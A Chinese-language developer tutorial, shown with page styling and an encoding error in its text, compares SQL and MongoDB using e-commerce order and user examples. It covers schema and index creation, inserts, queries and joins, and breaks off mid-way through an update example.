                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#444;background-image:linear-gradient(90deg,rgba(59,59,59,.1) 3%,transparent 0),linear-gradient(1turn,rgba(122,120,121,.1) 3%,transparent 0);background-size:30px 30px;background-position:50%;letter-spacing:1px;word-spacing:1px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{position:relative;margin-top:34px;margin-bottom:16px;font-weight:700;line-height:1.3;cursor:text;color:#444;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body h1{font-size:41px;margin-bottom:34px;line-height:1.5}.markdown-body h1:before{content:""}.markdown-body h2{font-size:30px;padding-left:.4em;border-left:.4em solid #5e5e5e;border-bottom:1px solid #444}.markdown-body h2:after{content:"ğŸ•›";position:absolute;top:0;right:0;transition:all;animation:rotate 10s linear infinite}@keyframes rotate{0%{transform:rotate(0deg)}to{transform:rotate(1turn)}}.markdown-body h3{border-left:.4em solid #8d8d8d;font-size:24px;padding-left:.4em}.markdown-body h4{font-size:20px}.markdown-body h5{font-size:16px}.markdown-body h6{font-size:14px}.markdown-body blockquote,.markdown-body dl,.markdown-body ol,.markdown-body p,.markdown-body table,.markdown-body ul{margin:.8em 0}.markdown-body strong{font-weight:1000;position:relative;color:#444;padding:0 3px}.markdown-body em{font-weight:inherit}.markdown-body a{box-sizing:border-box;color:grey;position:relative}.markdown-body a:before{position:absolute;box-sizing:border-box;content:"Go -&gt;";left:0;width:100%;max-width:0;color:#fff;background-color:hsla(0,0%,50.2%,.8);white-space:nowrap;transition:.2s ease;pointer-events:none;overflow:hidden}.markdown-body a:after{content:"";position:absolute;bottom:0;left:0;width:100%;height:1px;background-color:grey}.markdown-body a:active:before,.markdown-body a:hover:before{max-width:100%;padding-left:8px;border-radius:5px}.markdown-body hr{position:relative;width:100%;height:1px;border:none;margin-top:36px;margin-bottom:36px;background:linear-gradient(90deg,grey,#f1f1f1,#444,#444,#f1f1f1,grey);overflow:visible}.markdown-body ol,.markdown-body ul{padding-left:32px}.markdown-body ol li,.markdown-body ul li{margin-bottom:6px;list-style:inherit}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol{counter-reset:my-counter}.markdown-body ol&gt;li{padding-left:6px;list-style:none;counter-increment:my-counter;position:relative}.markdown-body ol&gt;li:before{position:absolute;left:-1.5em;content:counter(my-counter);font-weight:700}.markdown-body ol&gt;li:first-child:before{content:"1ï¸âƒ£"}.markdown-body ol&gt;li:nth-child(2):before{content:"2ï¸âƒ£"}.markdown-body ol&gt;li:nth-child(3):before{content:"3ï¸âƒ£"}.markdown-body ol&gt;li:nth-child(4):before{content:"4ï¸âƒ£"}.markdown-body ol&gt;li:nth-child(5):before{content:"5ï¸âƒ£"}.markdown-body ol&gt;li:nth-child(6):before{content:"6ï¸âƒ£"}.markdown-body ol&gt;li:nth-child(7):before{content:"7ï¸âƒ£"}.markdown-body ol&gt;li:nth-child(8):before{content:"8ï¸âƒ£"}.markdown-body ol&gt;li:nth-child(9):before{content:"9ï¸âƒ£"}.markdown-body ol&gt;li:nth-child(10):before{content:"ğŸ”Ÿ"}.markdown-body ul&gt;li{list-style:none;position:relative}.markdown-body ul&gt;li:before{z-index:10;position:absolute;left:-1.57em;content:"ğŸ”¹";margin-right:12px}.markdown-body ul&gt;li input{margin-left:8px!important}.markdown-body blockquote{position:relative;background-color:#d3d3d3;padding:5px 10px;border-left:.2em solid #000;border-radius:3px;transition:all .8s ease}.markdown-body blockquote:hover{opacity:.7}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(69,69,77,.8);color:#fff;font-size:.87em;padding:.07em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border-radius:7px;overflow:hidden}.markdown-body pre:before{z-index:10;position:absolute;top:14px;left:14px;width:12px;height:12px;border-radius:50%;background:#fc625d;-webkit-box-shadow:20px 0 #fdbc40,40px 0 #35cd4b;box-shadow:20px 0 #fdbc40,40px 0 #35cd4b;content:" "}.markdown-body pre:after{z-index:9;content:"";position:absolute;width:100%;height:40px;top:0;background-color:#1a1a1a}.markdown-body pre&gt;code{display:block;font-family:Menlo,Monaco,Consolas,Courier New,monospace;word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#171717;color:#bababa;font-size:14px;padding:40px 20px 20px}.markdown-body del{color:grey}.markdown-body table{margin-bottom:1.25rem;border-collapse:collapse}.markdown-body table td,.markdown-body table th{margin:0;padding:8px;line-height:20px;vertical-align:middle;border:1px solid #ddd}.markdown-body table thead,.markdown-body table tr:nth-child(2n){background-color:#fcfcfc}.markdown-body table thead th,.markdown-body table tr:nth-child(2n) th{font-weight:700;vertical-align:middle;color:#444}.markdown-body table tbody tr td{font-weight:400;color:#444}.markdown-body table tbody tr:hover{background-color:#d3d3d3}.markdown-body table tbody tr:hover td{color:#fff}.markdown-body img{max-width:100%;margin:0 12px}@media (max-width:720px){.markdown-body h1{font-size:32.8px}.markdown-body h2{font-size:24px}.markdown-body h3{font-size:19.2px}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:12.8px}}</style><style data-highlight="" data-highlight-key="hybrid">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#1d1f21}.hljs::selection,.hljs span::selection{background:#373b41}.hljs::-moz-selection,.hljs span::-moz-selection{background:#373b41}.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#c5c8c6}.hljs-name,.hljs-title{color:#f0c674}.hljs-comment,.hljs-meta,.hljs-meta .hljs-keyword{color:#707880}.hljs-deletion,.hljs-link,.hljs-literal,.hljs-number,.hljs-symbol{color:#c66}.hljs-addition,.hljs-doctag,.hljs-regexp,.hljs-selector-attr,.hljs-selector-pseudo,.hljs-string{color:#b5bd68}.hljs-attribute,.hljs-code,.hljs-selector-id{color:#b294bb}.hljs-bullet,.hljs-keyword,.hljs-selector-tag,.hljs-tag{color:#81a2be}.hljs-subst,.hljs-template-tag,.hljs-template-variable,.hljs-variable{color:#8abeb7}.hljs-built_in,.hljs-builtin-name,.hljs-quote,.hljs-section,.hljs-selector-class,.hljs-type{color:#de935f}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>å¾ˆé«˜å…´ä½ èƒ½æ¥é˜…è¯»ï¼Œè¿‡å»ä¸€å¹´å¤šï¼Œæˆ‘ä¸»è¦ä»äº‹å¤©çŒ«å›½é™…å•†å“ä»¥åŠè®¢å•ç›¸å…³æ•°ä»“å¼€å‘ä¸æ•°æ®åˆ†æå·¥ä½œã€‚æ¥ä¸‹æ¥ä¼šé™†ç»­åˆ†äº«è¿™æ®µç»å†ä¸­çš„å®æˆ˜é—®é¢˜ã€å¯¹åº”è§£å†³æ€è·¯ï¼Œä»¥åŠæ•°ä»“åŸºç¡€çš„è¿›é˜¶å­¦ä¹ æ€»ç»“ï¼Œå¸Œæœ›æˆ‘çš„åˆ†äº«èƒ½ç»™å¤§å®¶å¸¦æ¥å‚è€ƒå’Œå¸®åŠ©ï½</p>
</blockquote>
<h2 data-id="heading-0">MongoDBæ·±å…¥ä¸å®æˆ˜ï¼šåŸºäºSQLçš„å¯¹ç…§è§£æ</h2>
<p>MongoDBä½œä¸ºä¸»æµçš„æ–‡æ¡£å‹NoSQLæ•°æ®åº“ï¼Œå…¶æ•°æ®æ¨¡å‹å’ŒæŸ¥è¯¢é€»è¾‘ä¸å…³ç³»å‹æ•°æ®åº“ï¼ˆSQLï¼‰å­˜åœ¨æœ¬è´¨å·®å¼‚ï¼Œä½†å¯é€šè¿‡"æ¦‚å¿µæ˜ å°„+åœºæ™¯å¯¹ç…§"çš„æ–¹å¼å¿«é€ŸæŒæ¡ã€‚</p>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/31dd45e3b5b74ae1aebdc413a4bf6d8e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5qmZ57yW56CB5pel5b-X:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766472271&amp;x-signature=R0gC2K8ARbO0Ilsgnt8f1NwvJOY%3D" alt="image.png" width="70%" loading="lazy"/>
<p>æœ¬æ–‡ä»æ ¸å¿ƒæ¦‚å¿µå¯¹åº”å…¥æ‰‹ï¼Œç»“åˆé«˜é¢‘ä¸šåŠ¡åœºæ™¯ï¼Œå°†SQLè¯­å¥ä¸MongoDBæ“ä½œè¿›è¡Œç²¾å‡†åŒ¹é…ï¼Œå¹¶å»¶ä¼¸MongoDBçš„è¿›é˜¶ç‰¹æ€§ä¸å®æˆ˜ä¼˜åŒ–æŠ€å·§ï¼Œå®ç°ä»SQLæ€ç»´åˆ°MongoDBæ€ç»´çš„å¹³æ»‘è¿‡æ¸¡ã€‚</p>
<h3 data-id="heading-1">ä¸€ã€åŸºç¡€ï¼šMongoDBä¸SQLæ ¸å¿ƒæ¦‚å¿µæ˜ å°„</h3>
<p>å…³ç³»å‹æ•°æ®åº“é€šè¿‡"æ•°æ®åº“-è¡¨-è¡Œ-åˆ—"ç»„ç»‡æ•°æ®ï¼Œè€ŒMongoDBä»¥"æ•°æ®åº“-é›†åˆ-æ–‡æ¡£-å­—æ®µ"çš„æ–‡æ¡£æ¨¡å‹å®ç°ï¼ŒäºŒè€…æ ¸å¿ƒæ¦‚å¿µå­˜åœ¨æ˜ç¡®å¯¹åº”å…³ç³»ï¼Œè¿™æ˜¯åç»­æ“ä½œå¯¹ç…§çš„åŸºç¡€ã€‚</p>













































<table><thead><tr><th>SQLæ¦‚å¿µ</th><th>MongoDBæ¦‚å¿µ</th><th>æ ¸å¿ƒè¯´æ˜</th></tr></thead><tbody><tr><td>Databaseï¼ˆæ•°æ®åº“ï¼‰</td><td>Databaseï¼ˆæ•°æ®åº“ï¼‰</td><td>é€»è¾‘éš”ç¦»å•å…ƒï¼Œåˆ›å»ºä¸ä½¿ç”¨è¯­æ³•ç›¸ä¼¼ï¼ˆå¦‚USE db_nameï¼‰</td></tr><tr><td>Tableï¼ˆè¡¨ï¼‰</td><td>Collectionï¼ˆé›†åˆï¼‰</td><td>é›†åˆæ— éœ€é¢„å®šä¹‰ç»“æ„ï¼Œä¸åŒæ–‡æ¡£å¯åŒ…å«ä¸åŒå­—æ®µ</td></tr><tr><td>Rowï¼ˆè¡Œï¼‰</td><td>Documentï¼ˆæ–‡æ¡£ï¼‰</td><td>ä»¥BSONæ ¼å¼ï¼ˆJSONæ‰©å±•ï¼‰å­˜å‚¨ï¼Œè‡ªå¸¦å”¯ä¸€ä¸»é”®_id</td></tr><tr><td>Columnï¼ˆåˆ—ï¼‰</td><td>Fieldï¼ˆå­—æ®µï¼‰</td><td>å­—æ®µç±»å‹çµæ´»ï¼Œæ”¯æŒåµŒå¥—æ–‡æ¡£ã€æ•°ç»„ç­‰å¤æ‚ç±»å‹</td></tr><tr><td>Primary Keyï¼ˆä¸»é”®ï¼‰</td><td>_idå­—æ®µ</td><td>é»˜è®¤è‡ªåŠ¨ç”ŸæˆObjectIdï¼Œä¹Ÿå¯æ‰‹åŠ¨æŒ‡å®šï¼ˆéœ€ä¿è¯å”¯ä¸€ï¼‰</td></tr><tr><td>Indexï¼ˆç´¢å¼•ï¼‰</td><td>Indexï¼ˆç´¢å¼•ï¼‰</td><td>æ”¯æŒå•å­—æ®µã€å¤åˆç´¢å¼•ç­‰ï¼Œè¯­æ³•ä¸SQLé€»è¾‘ç›¸é€š</td></tr><tr><td>å…³é”®å·®å¼‚ï¼šMongoDBçš„"æ— æ¨¡å¼"ç‰¹æ€§â€”â€”é›†åˆä¸å¼ºåˆ¶æ–‡æ¡£ç»“æ„ç»Ÿä¸€ï¼Œå¯æ ¹æ®ä¸šåŠ¡éœ€æ±‚åŠ¨æ€æ‰©å±•å­—æ®µï¼Œè¿™ä¸SQLè¡¨çš„å›ºå®šåˆ—ç»“æ„å½¢æˆæ ¸å¿ƒåŒºåˆ«ã€‚</td><td/><td/></tr></tbody></table>
<ol>
<li>ä¼ ç»Ÿå…³ç³»å‹æ•°æ®åº“ï¼ˆå¦‚ MySQLï¼‰å¯¹<strong>éç»“æ„åŒ– / åŠç»“æ„åŒ–æ•°æ®</strong>æ”¯æŒä¸è¶³ï¼Œéš¾ä»¥é«˜æ•ˆå­˜å‚¨å•†å“å±æ€§ã€ç”¨æˆ·è¡Œä¸ºç­‰å¤šå˜æ•°æ®ã€‚</li>
<li>å…³ç³»å‹æ•°æ®åº“çš„<strong>æ°´å¹³æ‰©å±•èƒ½åŠ›å¼±</strong>ï¼Œé¢å¯¹é«˜å¹¶å‘ï¼ˆå¦‚ç”µå•†å¤§ä¿ƒï¼‰æ—¶ï¼Œæ‰©å®¹æˆæœ¬é«˜ã€æ•ˆç‡ä½ã€‚</li>
<li>å¼€å‘æ•ˆç‡éœ€æ±‚ï¼šMongoDB é‡‡ç”¨æ–‡æ¡£æ¨¡å‹ï¼Œæ— éœ€é¢„å…ˆå®šä¹‰ Schemaï¼Œè¿­ä»£é€Ÿåº¦å¿«ï¼Œé€‚é…äº’è”ç½‘äº§å“å¿«é€Ÿè¯•é”™çš„éœ€æ±‚ã€‚</li>
</ol>
<h3 data-id="heading-2">äºŒã€æ ¸å¿ƒåœºæ™¯ï¼šSQLä¸MongoDBæ“ä½œå®æˆ˜å¯¹ç…§</h3>
<p>ä»¥ä¸‹ä»¥ç”µå•†åœºæ™¯çš„"è®¢å•è¡¨ï¼ˆordersï¼‰"å’Œ"ç”¨æˆ·è¡¨ï¼ˆusersï¼‰"ä¸ºä¾‹ï¼Œè¦†ç›–åˆ›å»ºã€å¢åˆ æ”¹æŸ¥ã€èšåˆç»Ÿè®¡ç­‰é«˜é¢‘æ“ä½œï¼Œå®ç°SQLè¯­å¥åˆ°MongoDBæ“ä½œçš„ç›´æ¥æ˜ å°„ã€‚</p>
<h4 data-id="heading-3">åœºæ™¯1ï¼šç»“æ„å®šä¹‰ä¸ç´¢å¼•åˆ›å»º</h4>
<p>SQLéœ€å…ˆå®šä¹‰è¡¨ç»“æ„ï¼ŒMongoDBåˆ™é€šè¿‡æ’å…¥æ–‡æ¡£éšå¼åˆ›å»ºé›†åˆï¼Œç´¢å¼•åˆ›å»ºè¯­æ³•é€»è¾‘ä¸SQLä¸€è‡´ã€‚</p>
<p><strong>SQLå®ç°</strong></p>
<pre><code class="hljs language-sql" lang="sql">
<span class="hljs-comment">-- åˆ›å»ºè®¢å•è¡¨å¹¶å®šä¹‰ç»“æ„</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> orders (
  id <span class="hljs-type">INT</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> AUTO_INCREMENT,
  user_id <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">30</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
  order_no <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">50</span>) <span class="hljs-keyword">UNIQUE</span>,
  amount <span class="hljs-type">DECIMAL</span>(<span class="hljs-number">10</span>,<span class="hljs-number">2</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
  status <span class="hljs-type">CHAR</span>(<span class="hljs-number">1</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">'P'</span>, <span class="hljs-comment">-- P:å¾…æ”¯ä»˜ A:å·²å®Œæˆ C:å·²å–æ¶ˆ</span>
  create_time DATETIME <span class="hljs-keyword">DEFAULT</span> NOW(),
  <span class="hljs-keyword">PRIMARY</span> KEY (id),
  INDEX idx_user_status (user_id, status) <span class="hljs-comment">-- å¤åˆç´¢å¼•</span>
);

<span class="hljs-comment">-- åˆ›å»ºç”¨æˆ·è¡¨</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> users (
  user_id <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">30</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
  username <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">50</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
  phone <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">20</span>),
  <span class="hljs-keyword">PRIMARY</span> KEY (user_id)
);
</code></pre>
<p><strong>MongoDBå®ç°</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">
<span class="hljs-comment">// 1. éšå¼åˆ›å»ºé›†åˆï¼ˆæ’å…¥æ–‡æ¡£æ—¶è‡ªåŠ¨åˆ›å»ºï¼‰</span>
db.<span class="hljs-property">orders</span>.<span class="hljs-title function_">insertOne</span>({
  <span class="hljs-attr">user_id</span>: <span class="hljs-string">"u1001"</span>,
  <span class="hljs-attr">order_no</span>: <span class="hljs-string">"ORD20250001"</span>,
  <span class="hljs-attr">amount</span>: <span class="hljs-number">299.99</span>,
  <span class="hljs-attr">status</span>: <span class="hljs-string">"P"</span>,
  <span class="hljs-attr">create_time</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>()
});

<span class="hljs-comment">// 2. æ˜¾å¼åˆ›å»ºé›†åˆï¼ˆå¯é€‰ï¼Œå¯æ·»åŠ éªŒè¯è§„åˆ™ï¼‰</span>
db.<span class="hljs-title function_">createCollection</span>(<span class="hljs-string">"users"</span>, {
  <span class="hljs-attr">validator</span>: { <span class="hljs-comment">//  SchemaéªŒè¯ï¼ˆæ¨¡æ‹ŸSQLå­—æ®µçº¦æŸï¼‰</span>
    <span class="hljs-attr">$jsonSchema</span>: {
      <span class="hljs-attr">bsonType</span>: <span class="hljs-string">"object"</span>,
      <span class="hljs-attr">required</span>: [<span class="hljs-string">"user_id"</span>, <span class="hljs-string">"username"</span>],
      <span class="hljs-attr">properties</span>: {
        <span class="hljs-attr">user_id</span>: { <span class="hljs-attr">bsonType</span>: <span class="hljs-string">"string"</span> },
        <span class="hljs-attr">username</span>: { <span class="hljs-attr">bsonType</span>: <span class="hljs-string">"string"</span> },
        <span class="hljs-attr">phone</span>: { <span class="hljs-attr">bsonType</span>: <span class="hljs-string">"string"</span> }
      }
    }
  }
});

<span class="hljs-comment">// 3. åˆ›å»ºç´¢å¼•ï¼ˆå¯¹åº”SQLçš„INDEXï¼‰</span>
db.<span class="hljs-property">orders</span>.<span class="hljs-title function_">createIndex</span>({ <span class="hljs-attr">user_id</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">status</span>: <span class="hljs-number">1</span> }, { <span class="hljs-attr">name</span>: <span class="hljs-string">"idx_user_status"</span> });
db.<span class="hljs-property">orders</span>.<span class="hljs-title function_">createIndex</span>({ <span class="hljs-attr">order_no</span>: <span class="hljs-number">1</span> }, { <span class="hljs-attr">unique</span>: <span class="hljs-literal">true</span> }); <span class="hljs-comment">// å”¯ä¸€ç´¢å¼•</span>
db.<span class="hljs-property">users</span>.<span class="hljs-title function_">createIndex</span>({ <span class="hljs-attr">user_id</span>: <span class="hljs-number">1</span> }, { <span class="hljs-attr">unique</span>: <span class="hljs-literal">true</span> });
</code></pre>
<h4 data-id="heading-4">åœºæ™¯2ï¼šæ•°æ®æ’å…¥æ“ä½œ</h4>
<p>SQLä½¿ç”¨INSERTè¯­å¥ï¼ŒMongoDBæä¾›insertOneï¼ˆå•æ¡ï¼‰å’ŒinsertManyï¼ˆæ‰¹é‡ï¼‰æ–¹æ³•ï¼Œæ”¯æŒè‡ªåŠ¨ç”Ÿæˆä¸»é”®ã€‚</p>
<p><strong>SQLå®ç°</strong></p>
<pre><code class="hljs language-sql" lang="sql">
<span class="hljs-comment">-- å•æ¡æ’å…¥</span>
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> users(user_id, username, phone)
<span class="hljs-keyword">VALUES</span> ("u1001", "å¼ ä¸‰", "13800138000");

<span class="hljs-comment">-- æ‰¹é‡æ’å…¥</span>
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> orders(user_id, order_no, amount, status)
<span class="hljs-keyword">VALUES</span> 
("u1001", "ORD20250002", <span class="hljs-number">159.00</span>, "A"),
("u1002", "ORD20250003", <span class="hljs-number">329.50</span>, "P");
</code></pre>
<p><strong>MongoDBå®ç°</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">
<span class="hljs-comment">// å•æ¡æ’å…¥ï¼ˆ_idè‡ªåŠ¨ç”Ÿæˆï¼‰</span>
db.<span class="hljs-property">users</span>.<span class="hljs-title function_">insertOne</span>({
  <span class="hljs-attr">user_id</span>: <span class="hljs-string">"u1001"</span>,
  <span class="hljs-attr">username</span>: <span class="hljs-string">"å¼ ä¸‰"</span>,
  <span class="hljs-attr">phone</span>: <span class="hljs-string">"13800138000"</span>
});

<span class="hljs-comment">// æ‰¹é‡æ’å…¥ï¼ˆæ•ˆç‡é«˜äºå¤šæ¬¡insertOneï¼‰</span>
db.<span class="hljs-property">orders</span>.<span class="hljs-title function_">insertMany</span>([
  {
    <span class="hljs-attr">user_id</span>: <span class="hljs-string">"u1001"</span>,
    <span class="hljs-attr">order_no</span>: <span class="hljs-string">"ORD20250002"</span>,
    <span class="hljs-attr">amount</span>: <span class="hljs-number">159.00</span>,
    <span class="hljs-attr">status</span>: <span class="hljs-string">"A"</span>,
    <span class="hljs-attr">create_time</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>()
  },
  {
    <span class="hljs-attr">user_id</span>: <span class="hljs-string">"u1002"</span>,
    <span class="hljs-attr">order_no</span>: <span class="hljs-string">"ORD20250003"</span>,
    <span class="hljs-attr">amount</span>: <span class="hljs-number">329.50</span>,
    <span class="hljs-attr">status</span>: <span class="hljs-string">"P"</span>,
    <span class="hljs-attr">create_time</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>()
  }
]);
</code></pre>
<h4 data-id="heading-5">åœºæ™¯3ï¼šæ•°æ®æŸ¥è¯¢æ“ä½œï¼ˆå•è¡¨/å…³è”ï¼‰</h4>
<p>MongoDBçš„findæ–¹æ³•å¯¹åº”SQLçš„SELECTï¼Œæ”¯æŒæ¡ä»¶è¿‡æ»¤ã€å­—æ®µæŠ•å½±ã€æ’åºç­‰ï¼›å¤šè¡¨å…³è”åˆ™é€šè¿‡$lookupå®ç°SQLçš„JOINé€»è¾‘ã€‚</p>
<h5 data-id="heading-6">å­åœºæ™¯3.1ï¼šå•è¡¨æ¡ä»¶æŸ¥è¯¢ä¸æ’åº</h5>
<p><strong>SQLå®ç°</strong></p>
<pre><code class="hljs language-sql" lang="sql">
<span class="hljs-comment">-- æŸ¥è¯¢u1001ç”¨æˆ·çš„å·²å®Œæˆè®¢å•ï¼ŒæŒ‰åˆ›å»ºæ—¶é—´å€’åºï¼Œåªè¿”å›è®¢å•å·ã€é‡‘é¢ã€åˆ›å»ºæ—¶é—´</span>
<span class="hljs-keyword">SELECT</span> order_no, amount, create_time
<span class="hljs-keyword">FROM</span> orders
<span class="hljs-keyword">WHERE</span> user_id <span class="hljs-operator">=</span> "u1001" <span class="hljs-keyword">AND</span> status <span class="hljs-operator">=</span> "A"
<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> create_time <span class="hljs-keyword">DESC</span>;
</code></pre>
<p><strong>MongoDBå®ç°</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">
db.<span class="hljs-property">orders</span>.<span class="hljs-title function_">find</span>(
  { <span class="hljs-attr">user_id</span>: <span class="hljs-string">"u1001"</span>, <span class="hljs-attr">status</span>: <span class="hljs-string">"A"</span> }, <span class="hljs-comment">// æ¡ä»¶è¿‡æ»¤ï¼ˆå¯¹åº”WHEREï¼‰</span>
  { <span class="hljs-attr">order_no</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">amount</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">create_time</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">_id</span>: <span class="hljs-number">0</span> } <span class="hljs-comment">// å­—æ®µæŠ•å½±ï¼ˆ1æ˜¾ç¤ºï¼Œ0éšè—ï¼‰</span>
).<span class="hljs-title function_">sort</span>({ <span class="hljs-attr">create_time</span>: -<span class="hljs-number">1</span> }); <span class="hljs-comment">// æ’åºï¼ˆ-1å€’åºï¼Œ1æ­£åºï¼‰</span>
</code></pre>
<h5 data-id="heading-7">å­åœºæ™¯3.2ï¼šå¤šè¡¨å…³è”æŸ¥è¯¢ï¼ˆç”¨æˆ·-è®¢å•ï¼‰</h5>
<p><strong>SQLå®ç°</strong></p>
<pre><code class="hljs language-sql" lang="sql">
<span class="hljs-comment">-- å…³è”æŸ¥è¯¢ç”¨æˆ·ä¿¡æ¯ä¸å¯¹åº”è®¢å•ï¼Œåªæ˜¾ç¤ºå·²å®Œæˆè®¢å•</span>
<span class="hljs-keyword">SELECT</span> u.username, u.phone, o.order_no, o.amount
<span class="hljs-keyword">FROM</span> users u
<span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> orders o 
  <span class="hljs-keyword">ON</span> u.user_id <span class="hljs-operator">=</span> o.user_id
<span class="hljs-keyword">WHERE</span> o.status <span class="hljs-operator">=</span> "A";
</code></pre>
<p><strong>MongoDBå®ç°</strong></p>
<ul>
<li>è¯´æ˜ï¼šè¿™å—è¡¨å…³è”ï¼Œæˆ‘ä»¬çœŸå®åœºæ™¯ å¤§éƒ¨åˆ†é€šè¿‡Javaä»£ç æ¥å®ç°ï¼Œè¿™é‡Œåªæ˜¯ç»™å¤§å®¶ä¸¾ä¸€ä¸ªæ¡ˆä¾‹ï¼Œä»…ä»…å‚è€ƒã€‚çœŸå®çš„è®¢å•è¡¨ä¸€èˆ¬éƒ½æ˜¯å‡ åƒä¸‡çš„æ•°æ®ï¼Œä¸ªäººç†è§£å†™è„šæœ¬ä¸å¤ªå‹å¥½;</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript">
<span class="hljs-comment">// ç”¨èšåˆç®¡é“çš„$lookupå®ç°JOINï¼Œ$matchè¿‡æ»¤æ¡ä»¶</span>
db.<span class="hljs-property">users</span>.<span class="hljs-title function_">aggregate</span>([
  {
    <span class="hljs-attr">$lookup</span>: { <span class="hljs-comment">// å…³è”è®¢å•é›†åˆ</span>
      <span class="hljs-attr">from</span>: <span class="hljs-string">"orders"</span>, <span class="hljs-comment">// å…³è”çš„ç›®æ ‡é›†åˆï¼ˆå¯¹åº”SQLçš„JOINè¡¨ï¼‰</span>
      <span class="hljs-attr">localField</span>: <span class="hljs-string">"user_id"</span>, <span class="hljs-comment">// æœ¬åœ°å…³è”å­—æ®µ</span>
      <span class="hljs-attr">foreignField</span>: <span class="hljs-string">"user_id"</span>, <span class="hljs-comment">// ç›®æ ‡é›†åˆå…³è”å­—æ®µ</span>
      <span class="hljs-attr">as</span>: <span class="hljs-string">"user_orders"</span> <span class="hljs-comment">// å…³è”ç»“æœå­˜å‚¨çš„å­—æ®µå</span>
    }
  },
  { <span class="hljs-attr">$unwind</span>: <span class="hljs-string">"$user_orders"</span> }, <span class="hljs-comment">// æ‹†åˆ†æ•°ç»„ï¼ˆå°†å…³è”ç»“æœå±•å¼€ï¼‰</span>
  { <span class="hljs-attr">$match</span>: { <span class="hljs-string">"user_orders.status"</span>: <span class="hljs-string">"A"</span> } }, <span class="hljs-comment">// è¿‡æ»¤å·²å®Œæˆè®¢å•</span>
  {
    <span class="hljs-attr">$project</span>: { <span class="hljs-comment">// ç­›é€‰æ˜¾ç¤ºå­—æ®µ</span>
      <span class="hljs-attr">username</span>: <span class="hljs-number">1</span>,
      <span class="hljs-attr">phone</span>: <span class="hljs-number">1</span>,
      <span class="hljs-string">"user_orders.order_no"</span>: <span class="hljs-number">1</span>,
      <span class="hljs-string">"user_orders.amount"</span>: <span class="hljs-number">1</span>,
      <span class="hljs-attr">_id</span>: <span class="hljs-number">0</span>
    }
  }
]);
</code></pre>
<h4 data-id="heading-8">åœºæ™¯4ï¼šæ•°æ®æ›´æ–°ä¸åˆ é™¤</h4>
<p>MongoDBé€šè¿‡updateç³»åˆ—æ–¹æ³•å®ç°æ›´æ–°ï¼Œæ”¯æŒåŸå­æ“ä½œç¬¦ï¼ˆå¦‚<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>e</mi><mi>t</mi><mtext>ã€</mtext></mrow><annotation encoding="application/x-tex">setã€</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">se</span><span class="mord mathnormal">t</span><span class="mord cjk_fallback">ã€</span></span></span></span></span>incï¼‰ï¼Œåˆ é™¤åˆ™å¯¹åº”deleteOne/deleteManyæ–¹æ³•ã€‚</p>
<h5 data-id="heading-9">å­åœºæ™¯4.1ï¼šæ›´æ–°æ“ä½œï¼ˆä¿®æ”¹è®¢å•çŠ¶æ€ï¼‰</h5>
<p><strong>SQLå®ç°</strong></p>
<pre><code class="hljs language-sql" lang="sql">
<span class="hljs-comment">-- å°†è®¢å•ORD20250002çš„çŠ¶æ€æ”¹ä¸ºå·²å®Œæˆï¼Œå¹¶æ›´æ–°æ”¯ä»˜æ—¶é—´</span>
<span class="hljs-keyword">UPDATE</span> orders
<span class="hljs-keyword">SET</span> status <span class="hljs-operator">=</span> "A", pay_time <span class="hljs-operator">=</span> NOW()
